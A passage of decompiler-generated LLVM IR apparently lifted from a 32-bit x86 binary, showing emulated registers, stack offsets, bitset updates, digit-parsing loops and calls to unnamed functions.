  %v9_8049781 = shl i32 1, %v1_804977b
  %v12_8049781 = or i32 %v6_8049781, %v9_8049781
  store i32 %v12_8049781, i32* %v5_8049781, align 4
  %v0_8049789 = load i32, i32* @esi, align 4
  %v1_8049789 = add i32 %v0_8049789, -1440
  %v2_8049789 = inttoptr i32 %v1_8049789 to i32*
  %v3_8049789 = load i32, i32* %v2_8049789, align 4
  store i32 %v3_8049789, i32* %eax.global-to-local, align 4
  %v1_804978f = load i32, i32* @esp, align 4
  %v2_804978f = add i32 %v1_804978f, 72
  %v3_804978f = inttoptr i32 %v2_804978f to i32*
  %v4_804978f = load i32, i32* %v3_804978f, align 4
  %v5_804978f = sub i32 %v3_8049789, %v4_804978f
  %v11_804978f = xor i32 %v4_804978f, %v3_8049789
  %v12_804978f = xor i32 %v5_804978f, %v3_8049789
  %v13_804978f = and i32 %v12_804978f, %v11_804978f
  %v14_804978f = icmp slt i32 %v13_804978f, 0
  %v15_804978f = icmp eq i32 %v5_804978f, 0
  store i1 %v15_804978f, i1* %zf.global-to-local, align 1
  %v16_804978f = icmp slt i32 %v5_804978f, 0
  %v3_8049793 = icmp ne i1 %v16_804978f, %v14_804978f
  %v4_8049793 = or i1 %v15_804978f, %v3_8049793
  br i1 %v4_8049793, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_804979e:                             ; preds = %dec_label_pc_8048c10
  %v2_804979e = add i32 %v0_8048c1d, 12
  %v3_804979e = inttoptr i32 %v2_804979e to i32*
  store i32 %v3_8048bde, i32* %v3_804979e, align 4
  %v2_804979f = add i32 %v0_8048c1d, 8
  %v3_804979f = inttoptr i32 %v2_804979f to i32*
  store i32 %v3_8048bde, i32* %v3_804979f, align 4
  %v0_80497a0 = load i32, i32* @esi, align 4
  %v2_80497a0 = add i32 %v0_8048c1d, 4
  %v3_80497a0 = inttoptr i32 %v2_80497a0 to i32*
  store i32 %v0_80497a0, i32* %v3_80497a0, align 4
  %v1_80497a1 = add i32 %v0_8048c1d, 112
  %v2_80497a1 = inttoptr i32 %v1_80497a1 to i32*
  %v3_80497a1 = load i32, i32* %v2_80497a1, align 4
  store i32 %v3_80497a1, i32* @ebx, align 4
  %v3_80497a5 = inttoptr i32 %v0_8048c1d to i32*
  store i32 %v3_80497a1, i32* %v3_80497a5, align 4
  %v3_80497a6 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80497a6, i32* %eax.global-to-local, align 4
  %v0_80497ab = load i32, i32* @esp, align 4
  %v1_80497ab = add i32 %v0_80497ab, 16
  %v6_80497ab = icmp eq i32 %v1_80497ab, 0
  store i1 %v6_80497ab, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_80497b3:                             ; preds = %dec_label_pc_8048d89
  %v1_80497b3 = call i32 @function_8051fb9(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80497b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80497b3, i32* @ebx, align 4
  br label %dec_label_pc_80497ba

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_80497ed, %dec_label_pc_80497b3
  %v0_80497ba = phi i32 [ %v1_80497b3, %dec_label_pc_80497b3 ], [ %v0_80497ba.pre, %dec_label_pc_80497ed ]
  %v1_80497ba = inttoptr i32 %v0_80497ba to i32*
  store i32 0, i32* %v1_80497ba, align 4
  %v0_80497c0 = load i32, i32* @esp, align 4
  %v1_80497c0 = add i32 %v0_80497c0, -4
  %v2_80497c0 = inttoptr i32 %v1_80497c0 to i32*
  store i32 16384, i32* %v2_80497c0, align 4
  %v1_80497c5 = add i32 %v0_80497c0, -8
  %v2_80497c5 = inttoptr i32 %v1_80497c5 to i32*
  store i32 10240, i32* %v2_80497c5, align 4
  %v1_80497ca = add i32 %v0_80497c0, 131
  store i32 %v1_80497ca, i32* %ecx.global-to-local, align 4
  %v2_80497d1 = add i32 %v0_80497c0, -12
  %v3_80497d1 = inttoptr i32 %v2_80497d1 to i32*
  store i32 %v1_80497ca, i32* %v3_80497d1, align 4
  %v1_80497d2 = add i32 %v0_80497c0, 92
  %v2_80497d2 = inttoptr i32 %v1_80497d2 to i32*
  %v3_80497d2 = load i32, i32* %v2_80497d2, align 4
  store i32 %v3_80497d2, i32* %eax.global-to-local, align 4
  %v1_80497d6 = add i32 %v3_80497d2, -1452
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  %v3_80497d6 = load i32, i32* %v2_80497d6, align 4
  %v2_80497dc = add i32 %v0_80497c0, -16
  %v3_80497dc = inttoptr i32 %v2_80497dc to i32*
  store i32 %v3_80497d6, i32* %v3_80497dc, align 4
  %v0_80497dd = call i32 @function_805214e()
  store i32 %v0_80497dd, i32* %eax.global-to-local, align 4
  %v0_80497e2 = load i32, i32* @esp, align 4
  %v1_80497e2 = add i32 %v0_80497e2, 16
  %v1_80497e5 = icmp eq i32 %v0_80497dd, 0
  store i1 %v1_80497e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80497e5, label %dec_label_pc_8049b04, label %dec_label_pc_80497ed

dec_label_pc_80497ed:                             ; preds = %dec_label_pc_80497ba
  %v1_80497ed = add i32 %v0_80497dd, 1
  %v8_80497ed = icmp eq i32 %v1_80497ed, 0
  store i1 %v8_80497ed, i1* %zf.global-to-local, align 1
  store i32 %v1_80497ed, i32* %eax.global-to-local, align 4
  %v1_80497ee = icmp eq i1 %v8_80497ed, false
  %v0_80497ba.pre = load i32, i32* @ebx, align 4
  br i1 %v1_80497ee, label %dec_label_pc_80497ba, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497ed
  %v1_80497f0 = inttoptr i32 %v0_80497ba.pre to i32*
  %v2_80497f0 = load i32, i32* %v1_80497f0, align 4
  %v11_80497f0 = icmp eq i32 %v2_80497f0, 11
  store i1 %v11_80497f0, i1* %zf.global-to-local, align 1
  br i1 %v11_80497f0, label %dec_label_pc_8049c31, label %dec_label_pc_80497f9

dec_label_pc_80497f9:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_8049b04
  %v0_80497f9 = phi i32 [ %v1_80497e2, %dec_label_pc_80497f0 ], [ %v0_80497f9.pre, %dec_label_pc_8049b04 ]
  %v9_80497f9 = icmp eq i32 %v0_80497f9, 12
  store i1 %v9_80497f9, i1* %zf.global-to-local, align 1
  %v1_80497fc = add i32 %v0_80497f9, 92
  %v2_80497fc = inttoptr i32 %v1_80497fc to i32*
  %v3_80497fc = load i32, i32* %v2_80497fc, align 4
  store i32 %v3_80497fc, i32* %edx.global-to-local, align 4
  %v1_8049800 = add i32 %v3_80497fc, -1452
  %v2_8049800 = inttoptr i32 %v1_8049800 to i32*
  %v3_8049800 = load i32, i32* %v2_8049800, align 4
  store i32 %v3_8049800, i32* %ecx.global-to-local, align 4
  %v2_8049806 = add i32 %v0_80497f9, -16
  %v3_8049806 = inttoptr i32 %v2_8049806 to i32*
  store i32 %v3_8049800, i32* %v3_8049806, align 4
  %v1_8049807 = call i32 @function_8051a81(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8049807, i32* %eax.global-to-local, align 4
  %v0_804980c = load i32, i32* @esp, align 4
  %v1_804980c = add i32 %v0_804980c, 108
  %v2_804980c = inttoptr i32 %v1_804980c to i32*
  %v3_804980c = load i32, i32* %v2_804980c, align 4
  store i32 %v3_804980c, i32* %ecx.global-to-local, align 4
  %v6_8049810 = icmp eq i32 %v0_804980c, -16
  store i1 %v6_8049810, i1* %zf.global-to-local, align 1
  %v1_8049813 = add i32 %v3_804980c, -1452
  %v2_8049813 = inttoptr i32 %v1_8049813 to i32*
  store i32 -1, i32* %v2_8049813, align 4
  %v0_804981d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804981d = add i32 %v0_804981d, -1448
  %v2_804981d = inttoptr i32 %v1_804981d to i8*
  store i8 0, i8* %v2_804981d, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049829:                             ; preds = %dec_label_pc_8048557
  %v1_8049829 = add i32 %v0_80485a5, -1440
  %v2_8049829 = inttoptr i32 %v1_8049829 to i32*
  %v3_8049829 = load i32, i32* %v2_8049829, align 4
  %v1_8049831 = urem i32 %v3_8049829, 32
  store i32 %v1_8049831, i32* %eax.global-to-local, align 4
  %v2_8049834 = udiv i32 %v3_8049829, 32
  store i32 %v2_8049834, i32* %edx.global-to-local, align 4
  %v0_8049837 = load i32, i32* @esp, align 4
  %v2_8049837 = mul nuw nsw i32 %v2_8049834, 4
  %v3_8049837 = add nuw nsw i32 %v2_8049837, 20740
  %v4_8049837 = add i32 %v3_8049837, %v0_8049837
  %v5_8049837 = inttoptr i32 %v4_8049837 to i32*
  %v6_8049837 = load i32, i32* %v5_8049837, align 4
  %v9_8049837 = shl i32 1, %v1_8049831
  %v12_8049837 = or i32 %v6_8049837, %v9_8049837
  store i32 %v12_8049837, i32* %v5_8049837, align 4
  %v0_804983f = load i32, i32* @esi, align 4
  %v1_804983f = add i32 %v0_804983f, -1440
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  %v3_804983f = load i32, i32* %v2_804983f, align 4
  store i32 %v3_804983f, i32* %eax.global-to-local, align 4
  %v1_8049845 = load i32, i32* @esp, align 4
  %v2_8049845 = add i32 %v1_8049845, 72
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  %v4_8049845 = load i32, i32* %v3_8049845, align 4
  %v5_8049845 = sub i32 %v3_804983f, %v4_8049845
  %v11_8049845 = xor i32 %v4_8049845, %v3_804983f
  %v12_8049845 = xor i32 %v5_8049845, %v3_804983f
  %v13_8049845 = and i32 %v12_8049845, %v11_8049845
  %v14_8049845 = icmp slt i32 %v13_8049845, 0
  %v15_8049845 = icmp eq i32 %v5_8049845, 0
  store i1 %v15_8049845, i1* %zf.global-to-local, align 1
  %v16_8049845 = icmp slt i32 %v5_8049845, 0
  %v3_8049849 = icmp ne i1 %v16_8049845, %v14_8049845
  %v4_8049849 = or i1 %v15_8049845, %v3_8049849
  br i1 %v4_8049849, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8049854:                             ; preds = %dec_label_pc_80493fd, %dec_label_pc_80493d2
  %v1_8049854.in = phi i32 [ %v0_8049452, %dec_label_pc_80493fd ], [ %v0_80493f3, %dec_label_pc_80493d2 ]
  %v0_8049854 = load i32, i32* @edi, align 4
  %v2_8049854 = add i32 %v1_8049854.in, 12
  %v3_8049854 = inttoptr i32 %v2_8049854 to i32*
  store i32 %v0_8049854, i32* %v3_8049854, align 4
  %v0_8049855 = load i32, i32* @edi, align 4
  %v2_8049855 = add i32 %v1_8049854.in, 8
  %v3_8049855 = inttoptr i32 %v2_8049855 to i32*
  store i32 %v0_8049855, i32* %v3_8049855, align 4
  %v1_8049856 = add i32 %v1_8049854.in, 4
  %v2_8049856 = inttoptr i32 %v1_8049856 to i32*
  store i32 0, i32* %v2_8049856, align 4
  %v2_8049858 = inttoptr i32 %v1_8049854.in to i32*
  store i32 37, i32* %v2_8049858, align 4
  %v3_804985a = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804985a, i32* %eax.global-to-local, align 4
  %v0_804985f = load i32, i32* @esp, align 4
  %v9_804985f = icmp eq i32 %v0_804985f, -12
  store i1 %v9_804985f, i1* %zf.global-to-local, align 1
  %v2_8049862 = add i32 %v0_804985f, 8
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985a, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985f, 120
  %v2_8049863 = inttoptr i32 %v1_8049863 to i32*
  %v3_8049863 = load i32, i32* %v2_8049863, align 4
  %v2_8049867 = add i32 %v0_804985f, 4
  %v3_8049867 = inttoptr i32 %v2_8049867 to i32*
  store i32 %v3_8049863, i32* %v3_8049867, align 4
  %v1_8049868 = add i32 %v0_804985f, 147
  store i32 %v1_8049868, i32* @ecx, align 4
  %v3_804986f = inttoptr i32 %v0_804985f to i32*
  store i32 %v1_8049868, i32* %v3_804986f, align 4
  %v4_8049870 = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049875 = load i32, i32* @esp, align 4
  %v1_8049875 = add i32 %v0_8049875, 16
  %v1_8049878 = add i32 %v4_8049870, 1
  %v8_8049878 = icmp eq i32 %v1_8049878, 0
  store i1 %v8_8049878, i1* %zf.global-to-local, align 1
  store i32 %v1_8049878, i32* %eax.global-to-local, align 4
  br i1 %v8_8049878, label %dec_label_pc_8049a77, label %dec_label_pc_804987f

dec_label_pc_804987f:                             ; preds = %dec_label_pc_8049854
  %v0_804987f = load i32, i32* @ebx, align 4
  %v2_804987f = add i32 %v0_8049875, 12
  %v3_804987f = inttoptr i32 %v2_804987f to i32*
  store i32 %v0_804987f, i32* %v3_804987f, align 4
  %v0_8049880 = load i32, i32* @ebx, align 4
  %v2_8049880 = add i32 %v0_8049875, 8
  %v3_8049880 = inttoptr i32 %v2_8049880 to i32*
  store i32 %v0_8049880, i32* %v3_8049880, align 4
  %v1_8049881 = add i32 %v0_8049875, 4
  %v2_8049881 = inttoptr i32 %v1_8049881 to i32*
  store i32 0, i32* %v2_8049881, align 4
  %v2_8049883 = inttoptr i32 %v0_8049875 to i32*
  store i32 37, i32* %v2_8049883, align 4
  %v3_8049885 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049885, i32* %eax.global-to-local, align 4
  %v0_804988a = load i32, i32* @esp, align 4
  %v9_804988a = icmp eq i32 %v0_804988a, -12
  store i1 %v9_804988a, i1* %zf.global-to-local, align 1
  %v2_804988d = add i32 %v0_804988a, 8
  %v3_804988d = inttoptr i32 %v2_804988d to i32*
  store i32 %v3_8049885, i32* %v3_804988d, align 4
  %v1_804988e = add i32 %v0_804988a, 120
  %v2_804988e = inttoptr i32 %v1_804988e to i32*
  %v3_804988e = load i32, i32* %v2_804988e, align 4
  store i32 %v3_804988e, i32* @ecx, align 4
  %v2_8049892 = add i32 %v0_804988a, 4
  %v3_8049892 = inttoptr i32 %v2_8049892 to i32*
  store i32 %v3_804988e, i32* %v3_8049892, align 4
  %v1_8049893 = add i32 %v0_804988a, 147
  store i32 %v1_8049893, i32* %eax.global-to-local, align 4
  %v3_804989a = inttoptr i32 %v0_804988a to i32*
  store i32 %v1_8049893, i32* %v3_804989a, align 4
  %v4_804989b = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804989b, i32* %eax.global-to-local, align 4
  %v0_80498a0 = load i32, i32* @esp, align 4
  %v6_80498a0 = icmp eq i32 %v0_80498a0, -16
  store i1 %v6_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v4_804989b, i32* %ebx.global-to-local, align 4
  %v3_80498a5 = add i32 %v4_804989b, 147
  %v4_80498a5 = add i32 %v3_80498a5, %v0_80498a0
  %v5_80498a5 = inttoptr i32 %v4_80498a5 to i8*
  %v6_80498a5 = load i8, i8* %v5_80498a5, align 1
  %v12_80498a5 = icmp eq i8 %v6_80498a5, 32
  %v1_80498ad = zext i1 %v12_80498a5 to i32
  %v1_80498b0 = add i32 %v0_80498a0, 147
  store i32 %v1_80498b0, i32* %esi.global-to-local, align 4
  store i32 %v1_80498ad, i32* %eax.global-to-local, align 4
  %v1_80498bc = add i32 %v0_80498a0, 12
  %v2_80498bc = inttoptr i32 %v1_80498bc to i32*
  store i32 2, i32* %v2_80498bc, align 4
  %v1_80498be = add i32 %v0_80498a0, 8
  %v2_80498be = inttoptr i32 %v1_80498be to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_80498be, align 4
  %v0_80498c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80498c3 = add i32 %v1_80498c3, %v0_80498c3
  store i32 %v2_80498c3, i32* @ebx, align 4
  %v1_80498c5 = add i32 %v0_80498a0, 120
  %v2_80498c5 = inttoptr i32 %v1_80498c5 to i32*
  %v3_80498c5 = load i32, i32* %v2_80498c5, align 4
  %v2_80498c9 = sub i32 %v3_80498c5, %v2_80498c3
  store i32 %v2_80498c9, i32* %eax.global-to-local, align 4
  %v0_80498cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80498cb = add i32 %v0_80498cb, %v2_80498c3
  %v12_80498cb = icmp eq i32 %v2_80498cb, 0
  store i1 %v12_80498cb, i1* %zf.global-to-local, align 1
  store i32 %v2_80498cb, i32* @esi, align 4
  %v2_80498cd = add i32 %v0_80498a0, 4
  %v3_80498cd = inttoptr i32 %v2_80498cd to i32*
  store i32 %v2_80498c9, i32* %v3_80498cd, align 4
  %v0_80498ce = load i32, i32* @esi, align 4
  %v3_80498ce = inttoptr i32 %v0_80498a0 to i32*
  store i32 %v0_80498ce, i32* %v3_80498ce, align 4
  %v0_80498cf = call i32 @function_8051590()
  store i32 %v0_80498cf, i32* %eax.global-to-local, align 4
  %v0_80498d4 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v0_80498d4, 16
  store i32 %v0_80498cf, i32* @edi, align 4
  %v10_80498d9 = icmp eq i32 %v0_80498cf, -1
  store i1 %v10_80498d9, i1* %zf.global-to-local, align 1
  br i1 %v10_80498d9, label %dec_label_pc_8049a77, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_804987f
  %v10_80498e2 = icmp eq i32 %v0_80498cf, 1
  store i1 %v10_80498e2, i1* %zf.global-to-local, align 1
  %v7_80498e5 = icmp sgt i32 %v0_80498cf, 1
  br i1 %v7_80498e5, label %dec_label_pc_80498e7, label %dec_label_pc_80498ea

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_80498e2
  %v1_80498e7 = add i32 %v0_80498cf, -2
  %v9_80498e7 = icmp eq i32 %v1_80498e7, 0
  store i1 %v9_80498e7, i1* %zf.global-to-local, align 1
  store i32 %v1_80498e7, i32* @edi, align 4
  br label %dec_label_pc_80498ea

dec_label_pc_80498ea:                             ; preds = %dec_label_pc_80498e2, %dec_label_pc_80498e7
  %v1_80498ea = add i32 %v0_80498d4, 20920
  store i32 %v1_80498ea, i32* %eax.global-to-local, align 4
  %v1_80498f1 = add i32 %v0_80498d4, 20916
  %v2_80498f1 = inttoptr i32 %v1_80498f1 to i32*
  store i32 0, i32* %v2_80498f1, align 4
  %v0_80498fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80498fc = load i32, i32* @ebx, align 4
  %v2_80498fc = add i32 %v1_80498fc, %v0_80498fc
  %v12_80498fc = icmp eq i32 %v2_80498fc, 0
  store i1 %v12_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v2_80498fc, i32* %eax.global-to-local, align 4
  %v0_80498fe = load i32, i32* @esi, align 4
  store i32 %v0_80498fe, i32* %edx.global-to-local, align 4
  %v1_8049900 = load i32, i32* @edi, align 4
  %v2_8049900 = add i32 %v2_80498fc, -20773
  %v3_8049900 = add i32 %v2_8049900, %v1_8049900
  %v4_8049900 = inttoptr i32 %v3_8049900 to i8*
  store i8 0, i8* %v4_8049900, align 1
  %v0_8049908 = load i32, i32* @esi, align 4
  %v1_8049908 = inttoptr i32 %v0_8049908 to i8*
  %v2_8049908 = load i8, i8* %v1_8049908, align 1
  %v3_8049908 = zext i8 %v2_8049908 to i32
  %v4_8049908 = load i32, i32* @ecx, align 4
  %v5_8049908 = and i32 %v4_8049908, -256
  %v6_8049908 = or i32 %v5_8049908, %v3_8049908
  store i32 %v6_8049908, i32* @ecx, align 4
  %v1_804990a = add i32 %v6_8049908, -48
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  %v1_804990d = trunc i32 %v1_804990a to i8
  %v10_804990d = icmp eq i8 %v1_804990d, 9
  store i1 %v10_804990d, i1* %zf.global-to-local, align 1
  %tmp241 = icmp ult i8 %v1_804990d, 10
  br i1 %tmp241, label %dec_label_pc_8049911, label %dec_label_pc_8049928

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498ea
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049913

dec_label_pc_8049913:                             ; preds = %dec_label_pc_8049913, %dec_label_pc_8049911
  %v0_8049913 = phi i32 [ %v0_804991b, %dec_label_pc_8049913 ], [ 0, %dec_label_pc_8049911 ]
  %v1_8049913 = add i32 %v0_8049913, 1
  %v8_8049913 = icmp eq i32 %v1_8049913, 0
  store i1 %v8_8049913, i1* %zf.global-to-local, align 1
  store i32 %v1_8049913, i32* %edx.global-to-local, align 4
  %v1_8049914 = load i32, i32* @esp, align 4
  %v2_8049914 = add i32 %v1_8049914, 20900
  %v3_8049914 = inttoptr i32 %v2_8049914 to i32*
  store i32 %v1_8049913, i32* %v3_8049914, align 4
  %v0_804991b = load i32, i32* %edx.global-to-local, align 4
  %v1_804991b = load i32, i32* @esi, align 4
  %v2_804991b = add i32 %v1_804991b, %v0_804991b
  %v3_804991b = inttoptr i32 %v2_804991b to i8*
  %v4_804991b = load i8, i8* %v3_804991b, align 1
  %v5_804991b = zext i8 %v4_804991b to i32
  %v6_804991b = load i32, i32* @ecx, align 4
  %v7_804991b = and i32 %v6_804991b, -256
  %v8_804991b = or i32 %v7_804991b, %v5_804991b
  store i32 %v8_804991b, i32* @ecx, align 4
  %v1_804991e = add i32 %v8_804991b, -48
  store i32 %v1_804991e, i32* %eax.global-to-local, align 4
  %v1_8049921 = trunc i32 %v1_804991e to i8
  %v10_8049921 = icmp eq i8 %v1_8049921, 9
  store i1 %v10_8049921, i1* %zf.global-to-local, align 1
  %tmp242 = icmp ult i8 %v1_8049921, 10
  br i1 %tmp242, label %dec_label_pc_8049913, label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_8049913
  store i32 %v2_804991b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049928

dec_label_pc_8049928:                             ; preds = %dec_label_pc_80498ea, %dec_label_pc_8049925
  %v0_8049928 = phi i32 [ %v6_8049908, %dec_label_pc_80498ea ], [ %v8_804991b, %dec_label_pc_8049925 ]
  %v3_8049928 = trunc i32 %v0_8049928 to i8
  %v4_8049928 = icmp eq i8 %v3_8049928, 0
  store i1 %v4_8049928, i1* %zf.global-to-local, align 1
  br i1 %v4_8049928, label %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, label %dec_label_pc_8049930

dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge: ; preds = %dec_label_pc_8049928
  %v0_8049a77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a77

dec_label_pc_8049930:                             ; preds = %dec_label_pc_8049928
  %v0_8049930 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049930 = inttoptr i32 %v0_8049930 to i8*
  store i8 0, i8* %v1_8049930, align 1
  %v0_8049933 = load i32, i32* @esp, align 4
  %v1_8049933 = add i32 %v0_8049933, 20900
  %v2_8049933 = inttoptr i32 %v1_8049933 to i32*
  %v3_8049933 = load i32, i32* %v2_8049933, align 4
  store i32 %v3_8049933, i32* %edx.global-to-local, align 4
  %v1_804993a = add i32 %v3_8049933, 1
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i32 %v1_804993a, i32* %v2_8049933, align 4
  %v0_8049944 = load i32, i32* @esi, align 4
  %v1_8049944 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049944 = add i32 %v1_8049944, %v0_8049944
  %v3_8049944 = inttoptr i32 %v2_8049944 to i8*
  %v4_8049944 = load i8, i8* %v3_8049944, align 1
  %v10_8049944 = icmp eq i8 %v4_8049944, 32
  store i1 %v10_8049944, i1* %zf.global-to-local, align 1
  br i1 %v10_8049944, label %dec_label_pc_8049ee6, label %dec_label_pc_804994e

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049930, %dec_label_pc_8049ee6
  %v0_8049951 = phi i32 [ %v0_8049944, %dec_label_pc_8049930 ], [ %v0_8049951.pre, %dec_label_pc_8049ee6 ]
  %v0_804994e = load i32, i32* @esp, align 4
  store i32 %v0_8049951, i32* %eax.global-to-local, align 4
  %v1_8049953 = add i32 %v0_804994e, 20900
  %v2_8049953 = inttoptr i32 %v1_8049953 to i32*
  %v3_8049953 = load i32, i32* %v2_8049953, align 4
  store i32 %v3_8049953, i32* %edx.global-to-local, align 4
  %v2_804995a = add i32 %v3_8049953, %v0_8049951
  %v12_804995a = icmp eq i32 %v2_804995a, 0
  store i1 %v12_804995a, i1* %zf.global-to-local, align 1
  store i32 %v2_804995a, i32* %eax.global-to-local, align 4
  %v2_804995c = add i32 %v0_804994e, -16
  %v3_804995c = inttoptr i32 %v2_804995c to i32*
  store i32 %v2_804995a, i32* %v3_804995c, align 4
  %v2_804995d = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_804995d, i32* %eax.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v1_8049965 = add i32 %v0_8049962, 8
  %v2_8049965 = inttoptr i32 %v1_8049965 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80543b0.17 to i32), i32* %v2_8049965, align 4
  %v2_804996a = add i32 %v0_8049962, 4
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v2_804995d, i32* %v3_804996a, align 4
  %v1_804996b = add i32 %v0_8049962, 20916
  %v2_804996b = inttoptr i32 %v1_804996b to i32*
  %v3_804996b = load i32, i32* %v2_804996b, align 4
  store i32 %v3_804996b, i32* @ebp, align 4
  %v0_8049972 = load i32, i32* @esi, align 4
  %v2_8049974 = add i32 %v0_8049972, %v3_804996b
  %v12_8049974 = icmp eq i32 %v2_8049974, 0
  store i1 %v12_8049974, i1* %zf.global-to-local, align 1
  store i32 %v2_8049974, i32* %eax.global-to-local, align 4
  %v3_8049976 = inttoptr i32 %v0_8049962 to i32*
  store i32 %v2_8049974, i32* %v3_8049976, align 4
  %v4_8049977 = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804997c = load i32, i32* @esp, align 4
  %v1_804997c = add i32 %v0_804997c, 16
  %v1_804997f = add i32 %v4_8049977, 1
  %v8_804997f = icmp eq i32 %v1_804997f, 0
  store i1 %v8_804997f, i1* %zf.global-to-local, align 1
  store i32 %v1_804997f, i32* %eax.global-to-local, align 4
  br i1 %v8_804997f, label %dec_label_pc_80499c3, label %dec_label_pc_8049982

dec_label_pc_8049982:                             ; preds = %dec_label_pc_804994e
  %v0_8049985 = load i32, i32* @esi, align 4
  store i32 %v0_8049985, i32* %eax.global-to-local, align 4
  %v1_8049987 = add i32 %v0_804997c, 20916
  %v2_8049987 = inttoptr i32 %v1_8049987 to i32*
  %v3_8049987 = load i32, i32* %v2_8049987, align 4
  %v2_804998e = add i32 %v3_8049987, %v0_8049985
  %v12_804998e = icmp eq i32 %v2_804998e, 0
  store i1 %v12_804998e, i1* %zf.global-to-local, align 1
  store i32 %v2_804998e, i32* %eax.global-to-local, align 4
  %v3_8049990 = inttoptr i32 %v0_804997c to i32*
  store i32 %v2_804998e, i32* %v3_8049990, align 4
  %v2_8049991 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049991, i32* %eax.global-to-local, align 4
  %v0_8049996 = load i32, i32* @esp, align 4
  %v1_8049999 = add i32 %v0_8049996, 8
  %v2_8049999 = inttoptr i32 %v1_8049999 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80543b0.17 to i32), i32* %v2_8049999, align 4
  %v2_804999e = add i32 %v0_8049996, 4
  %v3_804999e = inttoptr i32 %v2_804999e to i32*
  store i32 %v2_8049991, i32* %v3_804999e, align 4
  %v1_804999f = add i32 %v0_8049996, 20916
  %v2_804999f = inttoptr i32 %v1_804999f to i32*
  %v3_804999f = load i32, i32* %v2_804999f, align 4
  store i32 %v3_804999f, i32* @ecx, align 4
  %v0_80499a6 = load i32, i32* @esi, align 4
  %v2_80499a8 = add i32 %v0_80499a6, %v3_804999f
  %v12_80499a8 = icmp eq i32 %v2_80499a8, 0
  store i1 %v12_80499a8, i1* %zf.global-to-local, align 1
  store i32 %v2_80499a8, i32* %eax.global-to-local, align 4
  %v3_80499aa = inttoptr i32 %v0_8049996 to i32*
  store i32 %v2_80499a8, i32* %v3_80499aa, align 4
  %v4_80499ab = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80499ab, i32* %eax.global-to-local, align 4
  %v0_80499b0 = load i32, i32* @esp, align 4
  %v1_80499b0 = add i32 %v0_80499b0, 20916
  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  %v3_80499b0 = load i32, i32* %v2_80499b0, align 4
  %v2_80499b7 = add i32 %v3_80499b0, %v4_80499ab
  store i32 %v2_80499b7, i32* %edx.global-to-local, align 4
  store i32 %v2_80499b7, i32* %v2_80499b0, align 4
  %v0_80499c0 = load i32, i32* @esp, align 4
  %v1_80499c0 = add i32 %v0_80499c0, 16
  %v6_80499c0 = icmp eq i32 %v1_80499c0, 0
  store i1 %v6_80499c0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_804994e, %dec_label_pc_8049982
  %v1_8049ef8 = phi i32 [ %v1_804997c, %dec_label_pc_804994e ], [ %v1_80499c0, %dec_label_pc_8049982 ]
  %v1_80499c3 = add i32 %v1_8049ef8, 20900
  %v2_80499c3 = inttoptr i32 %v1_80499c3 to i32*
  %v3_80499c3 = load i32, i32* %v2_80499c3, align 4
